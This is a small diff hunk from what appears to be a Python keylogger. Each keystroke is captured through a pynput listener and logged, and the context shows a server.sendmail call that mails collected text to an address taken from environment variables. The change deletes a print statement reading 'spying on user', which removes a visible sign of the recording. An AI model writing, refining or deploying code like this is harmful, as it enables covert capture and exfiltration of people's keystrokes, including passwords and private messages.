@@ -72,7 +72,6 @@ server.sendmail(os.getenv("Email"), os.getenv("SendEmail"), text)
 def key_handler(key):
     k = str(key).replace("'", "")
     logging.info(k)
-    print("spying on user")
 
 
 with Listener(on_press=key_handler)as listener:
